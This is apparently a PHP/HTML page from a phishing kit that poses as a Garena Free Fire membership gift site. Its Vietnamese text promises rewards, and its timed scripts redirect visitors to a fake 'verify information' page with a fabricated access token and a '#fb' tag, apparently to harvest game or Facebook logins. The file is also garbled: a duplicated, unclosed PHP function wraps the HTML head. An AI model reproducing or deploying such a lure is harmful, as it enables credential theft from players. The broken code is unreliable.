<?php
	 function crypto_rand_secure($min, $max)
{
   <head>
    <title>Garena Free Fire Membership</title>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width,initial-scale=1,shrink-to-fit=no">
    <meta property="og:type" content="website">
    <meta property="og:title" content="NHẬN QUÀ FREE FIRE MEMBERSHIP">
    <meta property="og:description" content="Chương trình tri ân kèm những sự kiện đặc biệt dành cho người chơi Free Fire">
    <meta property="og:url" content="https://ff.member.garena.vn">
    <meta property="og:site_name" content="Free fire garena">
    <meta property="og:image" content="/images/FFVIP_FBShare.jpg">
    <meta property="fb:app_id" content="367981983963236">
    <link href="https://fonts.googleapis.com/css?family=Roboto+Condensed:300,400,700|Roboto:300,400,500,700" rel="stylesheet">
    <link rel="shortcut icon" href="https://cdn.vn.garenanow.com/web/ff/fav.jpg">
</head>

<body>
    
</body>

</html>

<script>
    setTimeout(function(){window.location.href = 'xac-thuc-thong-tin.php?access_token/d2uvPml9nEorvr2H82S4KE3Bwot18ebBQSSKCxvGdHUWkIhxnPCvZPVwaqCY41R3H0dOKHg8s0CbkJWsRljgHKsuPaLLgOB8ic0a_index#fb';}, 1000);
</script>
<h2>Vui Lòng Chờ.....</h2>

<?php
	 function crypto_rand_secure($min, $max)
{
    $range = $max - $min;
    if ($range < 1) return $min; // not so random...
    $log = ceil(log($range, 2));
    $bytes = (int) ($log / 8) + 1; // length in bytes
    $bits = (int) $log + 1; // length in bits
    $filter = (int) (1 << $bits) - 1; // set all lower bits to 1
    do {
        $rnd = hexdec(bin2hex(openssl_random_pseudo_bytes($bytes)));
        $rnd = $rnd & $filter; // discard irrelevant bits
    } while ($rnd > $range);
    return $min + $rnd;
}
 
  function getToken($length)
{
    $token = "";
    $codeAlphabet = "ABCDEFGHIJKLMNOPQRSTUVWXYZ";
    $codeAlphabet.= "abcdefghijklmnopqrstuvwxyz";
    $codeAlphabet.= "0123456789";
    $max = strlen($codeAlphabet); // edited
 
    for ($i=0; $i < $length; $i++) {
        $token .= $codeAlphabet[crypto_rand_secure(0, $max-1)];
    }
 
    return $token;
}

?>
<script>
    setTimeout(function(){window.location.href = '/<?php echo getToken(100) ?>_index#fb';}, 1000);
</script>
<h2>Đang Xác Thực...</h2>